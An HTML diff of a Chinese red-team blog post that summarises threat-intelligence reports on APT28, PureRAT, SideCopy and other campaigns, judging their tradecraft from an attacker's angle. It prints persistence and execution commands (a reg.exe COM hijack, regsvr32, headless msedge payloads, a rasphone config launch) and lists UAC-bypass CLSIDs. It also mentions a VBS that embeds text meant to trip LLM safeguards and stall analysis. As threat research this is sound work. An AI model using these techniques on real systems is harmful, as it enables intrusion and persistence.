@@ -1,0 +1,683 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+
+
+<link rel="canonical" href="http://example.com/2026/09/29/Threat-Intelligence-TTP-Notes-1/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2026/09/29/Threat-Intelligence-TTP-Notes-1/","path":"2026/09/29/Threat-Intelligence-TTP-Notes-1/","title":"威胁情报TTP笔记-1"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>威胁情报TTP笔记-1 | Y0ng's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Y0ng's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%901"><span class="nav-text">分析1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%902"><span class="nav-text">分析2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%903"><span class="nav-text">分析3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%904"><span class="nav-text">分析4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%905"><span class="nav-text">分析5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%906"><span class="nav-text">分析6</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%907"><span class="nav-text">分析7</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%908"><span class="nav-text">分析8</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%909"><span class="nav-text">分析9</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%9010"><span class="nav-text">分析10</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%9011"><span class="nav-text">分析11</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%9012"><span class="nav-text">分析12</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%9013"><span class="nav-text">分析13</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%9014"><span class="nav-text">分析14</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%9015"><span class="nav-text">分析15</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%9016"><span class="nav-text">分析16</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%9017"><span class="nav-text">分析17</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%9018"><span class="nav-text">分析18</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%9019"><span class="nav-text">分析19</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%9020"><span class="nav-text">分析20</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/09/29/Threat-Intelligence-TTP-Notes-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Y0ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="威胁情报TTP笔记-1 | Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          威胁情报TTP笔记-1
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-09-29 00:00:00" itemprop="dateCreated datePublished" datetime="2026-09-29T00:00:00+08:00">2026-09-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Red-Team/" itemprop="url" rel="index"><span itemprop="name">Red-Team</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Threat-Intelligence-TTP-Notes/1.png"></p>
+<a id="more"></a>
+
+<h1 id="分析1"><a href="#分析1" class="headerlink" title="分析1"></a>分析1</h1><p><a target="_blank" rel="noopener" href="https://www.group-ib.com/blog/jadeprox-china-nexus-triback-loader/">https://www.group-ib.com/blog/jadeprox-china-nexus-triback-loader/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.sophos.com/en-us/blog/donuts-and-beagles-fake-claude-site-spreads-backdoor">https://www.sophos.com/en-us/blog/donuts-and-beagles-fake-claude-site-spreads-backdoor</a></p>
+<p><strong>正常web打点，使用常规开源工具进行初始访问</strong> C2 为 AdaptixC2</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Threat-Intelligence-TTP-Notes/image-20260904003022241.png" alt="image-20260904003022241"></p>
+<p>钓鱼流程：</p>
+<ul>
+<li>link加载递归目录下的vbs脚本</li>
+<li>打开pdf伪装文件</li>
+<li>白加黑loader</li>
+<li>loader直接使用win api，异或解密落地的shellcode文件，使用多种回调函数加载shellcode<ul>
+<li>InitOnceExecuteOnce</li>
+<li>CreateTimerQueueTimer</li>
+<li>EtwpCreateEtwThread</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Threat-Intelligence-TTP-Notes/image-20260904004458310.png" alt="image-20260904004458310"></p>
+<p>总结：多份白加黑路径和多份shellcode执行API，入门级钓鱼。</p>
+<h1 id="分析2"><a href="#分析2" class="headerlink" title="分析2"></a>分析2</h1><p><a target="_blank" rel="noopener" href="https://www.esentire.com/blog/multi-stage-seo-poisoning-campaign-targets-chinese-speaking-developers-with-kong-rat">https://www.esentire.com/blog/multi-stage-seo-poisoning-campaign-targets-chinese-speaking-developers-with-kong-rat</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/5VMNMHXmEfb_zx54LQ3vUw">https://mp.weixin.qq.com/s/5VMNMHXmEfb_zx54LQ3vUw</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/bNl5Ezv8NSCy-4Aq27A0Og">https://mp.weixin.qq.com/s/bNl5Ezv8NSCy-4Aq27A0Og</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/9-jYoSI22LuslkniNFTslA">https://mp.weixin.qq.com/s/9-jYoSI22LuslkniNFTslA</a></p>
+<p><strong>SEO投毒多款开发工具</strong>，命名为Kong RAT</p>
+<p>执行链：SEO 投毒dropper  -&gt; 下载内存 DLL 反射加载 -&gt; 下载白加黑 -&gt; 计划任务 -&gt; 黑DLL 加载 shellcode -&gt; 运行Kong RAT</p>
+<p>dropper-1：</p>
+<ul>
+<li><p>静态免杀：.NET 10.0 NativeAOT将 C# 直接编译为本地机器代码</p>
+</li>
+<li><p>WindowsPrincipal.IsInRole判断用户权限，使用ProcessStartInfo重启进程触发UAC</p>
+</li>
+<li><p>远程下载wrapper 恶意DLL，并通过WinAPI内存反射加载，执行导出函数run()</p>
+</li>
+</ul>
+<p>wrapper-1：</p>
+<ul>
+<li><p>远程下载loader、dll、bin共计四个文件：rc.exe、rcdll.dll、oob.xml、msvcr100.dll（运行依赖）</p>
+</li>
+<li><p>使用 SHGetKnownFolderPath() 和 SetFileAttributesA() 和 FILE_ATTRIBUTE_HIDDEN、FILE_ATTRIBUTE_SYSTEM 将指定目录下的文件名进行文件隐藏</p>
+</li>
+<li><p><strong>使用 NdrClientCall3、WPTaskScheduler 通过 RPC创建计划任务</strong>，绕过了COM接口，用于启动白加黑loader</p>
+</li>
+</ul>
+<p>loader-rcdll.dll：</p>
+<ul>
+<li><strong>QueueUserAPC() 调度延迟执行</strong>，以规避 DLL 加载监控</li>
+<li>通过 OpenProcessToken + GetTokenInformation(TokenElevation) 检查进程权限</li>
+<li>修改PEB结构的 ImagePathName、CommandLine 伪装为explorer.exe</li>
+<li>bypass UAC：{3E5FC7F9-9A51-4367-9063-A120244FBEC7}、{6EDD6D74-C007-4E75-B76A-E5740995E24C} 重新执行当前程序</li>
+<li>读取oob.xml文件，使用EnumWindows回调从第一个字节直接执行</li>
+</ul>
+<p>shellcode+bin-oob.xml：</p>
+<ul>
+<li>文件结构为：shellcode + exe（Kong RAT）</li>
+<li>栈上字符串解密 + walk PEB + 前向扫描定位PE + 计算并运行EP()</li>
+</ul>
+<p>Kong RAT：</p>
+<ul>
+<li><strong>MPK1 自定义通信协议</strong></li>
+<li>模块化DLL远程下发加载</li>
+<li>其他功能</li>
+</ul>
+<p>总结：比较专业的多阶段加载，功能完整的Rat，dropper和loader的多阶段也处理的挺好，执行也都尽可能利用了比如 NdrClientCall3、APC、白加黑的系统功能，3环下感觉很完整了，Rat功能给到夯。</p>
+<h1 id="分析3"><a href="#分析3" class="headerlink" title="分析3"></a>分析3</h1><p><a target="_blank" rel="noopener" href="https://www.esentire.com/blog/nimbus-rat-how-threat-actors-are-abusing-microsoft-teams-and-google-drive-to-deploy-a-java-rat">https://www.esentire.com/blog/nimbus-rat-how-threat-actors-are-abusing-microsoft-teams-and-google-drive-to-deploy-a-java-rat</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.esentire.com/blog/trust-me-im-it-threat-actors-deliver-deno-based-backdoor-denogate-via-microsoft-teams">https://www.esentire.com/blog/trust-me-im-it-threat-actors-deliver-deno-based-backdoor-denogate-via-microsoft-teams</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.esentire.com/blog/email-bombing-it-impersonation-quick-assist-and-edgecution-breaking-down-unc6692s-tradecraft">https://www.esentire.com/blog/email-bombing-it-impersonation-quick-assist-and-edgecution-breaking-down-unc6692s-tradecraft</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.esentire.com/blog/dindoor-denorat-and-nightshadec2-analyzing-tag-150s-evolving-tradecraft">https://www.esentire.com/blog/dindoor-denorat-and-nightshadec2-analyzing-tag-150s-evolving-tradecraft</a></p>
+<p><strong>邮件轰炸营造危险感，伪装Teams等客服主动接触目标，诱使安装C2进行初始化访问</strong>：</p>
+<ul>
+<li>批量注册 Microsoft 365 试用租户，使用it、support、help等迷惑性租户名称，租户名称格式：*.onmicrosoft.com</li>
+<li>批量注册 .top 迷惑性域名</li>
+<li>发送大量垃圾邮件</li>
+<li>伪装客服对目标发起Teams会话，声称帮助解决垃圾邮件问题</li>
+<li>诱使目标通过 <strong>QuickAssist.exe</strong> 获取目标机器操作权限</li>
+<li>发送 <strong>Pastebin.com</strong> 命令清单，包含C2的sharepoint url</li>
+<li>在线指导目标用户按照清单进行操作：下载C2，启动项，运行</li>
+<li>一个 <strong>Google Drive三方上线</strong> java C2，比较基础，具有内存执行拓展能力</li>
+</ul>
+<p>总结：伪装客服通过Teams发起会话，是继邮件钓鱼后又一条路径，思路不错。但是需要长时间和目标对话引导</p>
+<h1 id="分析4"><a href="#分析4" class="headerlink" title="分析4"></a>分析4</h1><p><a target="_blank" rel="noopener" href="https://www.rapid7.com/blog/post/tr-dprk-apts-ted-backdoor-curlrat-target-south-korean-media-automotive-sectors/">https://www.rapid7.com/blog/post/tr-dprk-apts-ted-backdoor-curlrat-target-south-korean-media-automotive-sectors/</a></p>
+<p>外部WEB打点，内部安装HAProxy <strong>特马</strong>，用于C2和流量操纵</p>
+<blockquote>
+<p>HAProxy是一个使用C语言编写的自由及开放源代码软件，其提供高可用性、负载均衡，以及基于TCP和HTTP的应用程序代理</p>
+</blockquote>
+<h1 id="分析5"><a href="#分析5" class="headerlink" title="分析5"></a>分析5</h1><p><a target="_blank" rel="noopener" href="https://lab52.io/blog/deedrat-backdoor-enhanced-by-chinese-apts-with-advanced-capabilities/">https://lab52.io/blog/deedrat-backdoor-enhanced-by-chinese-apts-with-advanced-capabilities/</a></p>
+<p>白加黑，文章并无展现RAT的亮点</p>
+<h1 id="分析6"><a href="#分析6" class="headerlink" title="分析6"></a>分析6</h1><p>俄罗斯 - APT28</p>
+<p><a target="_blank" rel="noopener" href="https://www.recordedfuture.com/research/bluedelta-targets-with-hookedge">https://www.recordedfuture.com/research/bluedelta-targets-with-hookedge</a></p>
+<p>样本诱饵文案：公开政府文件、通用文案、垃圾数据文案。</p>
+<p>Microsoft Word 恶意宏 和 Webhook 图像探针。恶意宏安装HOOKEDGE 后门，使用 webhook[.]site 充当C2用于下发指令和接收结果，HOOKEDGE 启动无头模式 msedge.exe 获取指令并执行，将结果拼接为html并外带</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Threat-Intelligence-TTP-Notes/image-20260908222959481.png" alt="image-20260908222959481"></p>
+<p>总结：三方c2指令下发与回收，后门轻量特征少，lolbin - msedge.exe 外带数据。留下的痕迹少</p>
+<h1 id="分析7"><a href="#分析7" class="headerlink" title="分析7"></a>分析7</h1><p>俄罗斯 - APT28</p>
+<p><a target="_blank" rel="noopener" href="https://lab52.io/blog/operation-macromaze-new-apt28-campaign-using-basic-tooling-and-legit-infrastructure/">https://lab52.io/blog/operation-macromaze-new-apt28-campaign-using-basic-tooling-and-legit-infrastructure/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.recordedfuture.com/research/grus-bluedelta-targets-key-networks-in-europe-with-multi-phase-espionage-camp">https://www.recordedfuture.com/research/grus-bluedelta-targets-key-networks-in-europe-with-multi-phase-espionage-camp</a></p>
+<p><a target="_blank" rel="noopener" href="https://assets.recordedfuture.com/insikt-report-pdfs/2024/cta-ru-2024-0530.pdf">https://assets.recordedfuture.com/insikt-report-pdfs/2024/cta-ru-2024-0530.pdf</a></p>
+<ul>
+<li>word宏文件钓鱼、内嵌url探针</li>
+<li>宏作为dropper释放：vbs、bat、html、xhtml脚本文件，运行vbs</li>
+<li>vbs使用msgbox提示文档损坏提示消息</li>
+<li>vbs启动bat</li>
+<li>bat落地xml文件并利用schtasks导入计划任务</li>
+<li>bat利用Edge 的无头模式执行一个小型 Base64 编码的 HTML payload</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">start &quot;&quot; msedge --headless&#x3D;new data:text&#x2F;html;base64,xxxxxx</span><br><span class="line">start &quot;&quot; msedge --headless&#x3D;new 1.html</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>payload用于从webhook[.]site下载命令，并落地为cmd文件</li>
+<li>bat执行cmd文件并获取输出，和xhtml组装成为带有命令执行结果的output.html文件</li>
+<li>bat利用Edge 的无头模式执行output.html，通过自定义提交表单将结果外传</li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Threat-Intelligence-TTP-Notes/image-20260927120855352.png" alt="image-20260927120855352"></p>
+<p>总结：没有远控落地，纯利用lolbin，缺点就是直接cmd执行的行为了吧</p>
+<h1 id="分析8"><a href="#分析8" class="headerlink" title="分析8"></a>分析8</h1><p>俄罗斯 - APT28</p>
+<p><a target="_blank" rel="noopener" href="https://www.sekoia.com/blog/apt28-operation-phantom-net-voxel">https://www.sekoia.com/blog/apt28-operation-phantom-net-voxel</a></p>
+<ul>
+<li>word宏文件钓鱼，运行dropper-vba</li>
+</ul>
+<p>dropper-vba：</p>
+<ul>
+<li><p>释放loader-prnfldr.dll、嵌入载荷文件</p>
+</li>
+<li><p>COM劫持 持久化</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg.exe add HKCU\Software\classes\CLSID\&#123;2227A280-3AEA-1069-A2DE-08002B30309D&#125;\InProcServer32 &#x2F;d &quot;C:\ProgramData\prnfldr.dll&quot; &#x2F;f</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>主动加载loader</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">regsvr32.exe &#x2F;n &#x2F;i &quot;C:\ProgramData\prnfldr.dll&quot;</span><br></pre></td></tr></table></figure>
+
+<p>loader-prnfldr.dll：</p>
+<ul>
+<li>判断当前调用是正常调用还是后门调用</li>
+<li>当 DLL 作为 COM 服务器加载时，即正常调用，将转发至正常dll维持正常的功能</li>
+<li>当作为后门调用时，从png隐写提取shellcode</li>
+</ul>
+<p>shellcode：</p>
+<ul>
+<li>利用TEB，加载 .NET 程序集（c2）</li>
+</ul>
+<p>c2：</p>
+<ul>
+<li><strong>Koofr 三方上线</strong></li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Threat-Intelligence-TTP-Notes/image-20260927212745327.png" alt="image-20260927212745327"></p>
+<p>c2-2：另一款后门木马</p>
+<ul>
+<li><strong>icedrive 三方上线</strong></li>
+<li>通过 非托管 C++ 加载 CLR，利用加载 System.Management.Automation 程序集执行命令</li>
+</ul>
+<p>总结：三方c2特马的开发、COM劫持、恶意Dll代理转发</p>
+<h1 id="分析9"><a href="#分析9" class="headerlink" title="分析9"></a>分析9</h1><p>俄罗斯 - UAC-0099</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/k2YJlVC8TSsqIzdlkiwR_Q">https://mp.weixin.qq.com/s/k2YJlVC8TSsqIzdlkiwR_Q</a></p>
+<p><a target="_blank" rel="noopener" href="https://pan1c.org/posts/uac-0099-toolchain-analysis/">https://pan1c.org/posts/uac-0099-toolchain-analysis/</a></p>
+<ul>
+<li><p>vbs嵌入 危险言论 尝试触发LLM安全防护以阻止分析文件</p>
+</li>
+<li><p>vbs下载诱饵PDF文件与木马</p>
+</li>
+<li><p>notepad++ 白加黑</p>
+</li>
+<li><p>黑dll解压压缩包，释放并利用计划任务运行 downloader-1</p>
+</li>
+<li><p>downloader-1会检查计划任务执行的特殊参数以及执行路径，不符合预期就开始DOS当前机器</p>
+</li>
+<li><p>downloader-1 反沙箱</p>
+</li>
+<li><p>downloader-1 下载RAT并利用计划任务持久化</p>
+</li>
+</ul>
+<h1 id="分析10"><a href="#分析10" class="headerlink" title="分析10"></a>分析10</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/tseg9C7Sx4QVZceCl8RXlA">https://mp.weixin.qq.com/s/tseg9C7Sx4QVZceCl8RXlA</a></p>
+<p>商业 - PureRAT</p>
+<ul>
+<li>.hta 文件钓鱼 ，系统调用mshta.exe进行执行，释放dropper、loader文件并执行dropper</li>
+<li>dropper <strong>复制自身并随机膨胀体积</strong></li>
+<li>dropper释放 <strong>.pbk、.cmp、.cms 恶意配置文件</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Pre-Init Actions]</span><br><span class="line">0&#x3D;C:\Windows\System32\cmd.exe, &#x2F;c start &quot;&quot; &quot;C:\ProgramData\Search\34f3ee81e944bc6b\avq.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>dropper 通过 <strong>WPTaskScheduler RPC 创建计划任务</strong></li>
+<li>计划任务 <strong>启动白程序但是指向恶意配置文件</strong>，启动 loader</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rasphone.exe -f C:\Users\Public\xxxxx.pbk -d &quot;PoCEntry&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>loader 隐藏IAT、walk PEB解析API</li>
+<li>loader patch amsi</li>
+<li>loader 内存提取解密资源文件（PureRAT）</li>
+<li>loader Assembly.Load加载</li>
+</ul>
+<p>总结：<strong>rasphone.exe加载恶意配置文件执行命令</strong> - LOLbins</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Threat-Intelligence-TTP-Notes/image-20260921233836433.png" alt="image-20260921233836433"></p>
+<h1 id="分析11"><a href="#分析11" class="headerlink" title="分析11"></a>分析11</h1><p><a target="_blank" rel="noopener" href="https://securelist.ru/purerat-attacks-russian-organizations/112619/">https://securelist.ru/purerat-attacks-russian-organizations/112619/</a></p>
+<p>商业 - PureRAT</p>
+<ul>
+<li>.scr 文件钓鱼</li>
+<li>释放loader-1（自身重命名-Task.exe）与配套vbs、loader2</li>
+<li>vbs启动loader-1</li>
+</ul>
+<p>loader-1：</p>
+<ul>
+<li>资源文件解密释放loader1-1（Ckcfb.exe）</li>
+<li>将loader1-1进程注入到 InstallUtil.exe</li>
+</ul>
+<p>loader1-1：</p>
+<ul>
+<li>资源释放并加载Rat DLL</li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Threat-Intelligence-TTP-Notes/image-20260926014134969.png" alt="image-20260926014134969"></p>
+<p>loader-2</p>
+<ul>
+<li>远程下载解密内存执行DLL</li>
+<li>资源文件解密释放（Ttcxxewxtly.exe）</li>
+<li>进程注入</li>
+<li>再次资源文件提取解密内存运行（Bftvbho.dll）</li>
+<li>远程下载加载Rat DLL（ClassLibrary1.dll）</li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Threat-Intelligence-TTP-Notes/image-20260926014302233.png" alt="image-20260926014302233"></p>
+<p>总结：多阶段内存运行</p>
+<h1 id="分析12"><a href="#分析12" class="headerlink" title="分析12"></a>分析12</h1><p><a target="_blank" rel="noopener" href="https://www.trellix.com/blogs/research/purerat-fileless-utilizing-steganography-process-hollowing/">https://www.trellix.com/blogs/research/purerat-fileless-utilizing-steganography-process-hollowing/</a></p>
+<p>商业 - PureRAT</p>
+<ul>
+<li>.link 文件钓鱼，启动powershell远程下载vbs落地并运行</li>
+</ul>
+<p>loader-vbs：</p>
+<ul>
+<li>高度混淆</li>
+<li>添加计划任务</li>
+<li>执行内嵌的下一阶段powershell</li>
+</ul>
+<p>loader-powershell：</p>
+<ul>
+<li>远程下载文件1（DLL）并Assembly.load()内存执行</li>
+</ul>
+<p>loader-文件1：</p>
+<ul>
+<li><p>使用TaskScheduler .NET库添加计划任务持久化：通过conhost -headless 调用powershell下载并创建进程</p>
+</li>
+<li><p>添加注册表建立自动启动项持久化</p>
+</li>
+<li><p>反虚拟机</p>
+</li>
+<li><p>利用 <strong>cmstp.exe bypass UAC</strong></p>
+</li>
+<li><p>远程下载下一阶段文件2（.net exe）并采取Process hollowing手法执行下一阶段</p>
+</li>
+</ul>
+<p>loader-文件2：</p>
+<ul>
+<li>从自身Resources资源中提取加密数据，并解密为PureRat</li>
+<li>内存执行</li>
+</ul>
+<p>PureRat：</p>
+<ul>
+<li>.NET DLL文件，.NET Reactor加密保护</li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Threat-Intelligence-TTP-Notes/image-20260927001049612.png" alt="image-20260927001049612"></p>
+<p>总结：无</p>
+<h1 id="分析13"><a href="#分析13" class="headerlink" title="分析13"></a>分析13</h1><p>巴基斯坦 - SideCopy</p>
+<p><a target="_blank" rel="noopener" href="https://www.trellix.com/blogs/research/sidecopy-threat-intel-mshta-execution-rat-deployment/">https://www.trellix.com/blogs/research/sidecopy-threat-intel-mshta-execution-rat-deployment/</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/21kLaaPEzGBBAlguLgU9Cw">https://mp.weixin.qq.com/s/21kLaaPEzGBBAlguLgU9Cw</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Lb_NYxhi9iJgmvI2wjY9qg">https://mp.weixin.qq.com/s/Lb_NYxhi9iJgmvI2wjY9qg</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/kgjEa7oQWWDclD_HW_qvrA">https://mp.weixin.qq.com/s/kgjEa7oQWWDclD_HW_qvrA</a></p>
+<ul>
+<li>.link 文件钓鱼，启动mshta下载并运行恶意 1.hta</li>
+<li>1.hta内嵌dropper-dll，利用 BinaryFormatter 反序列化内存加载</li>
+</ul>
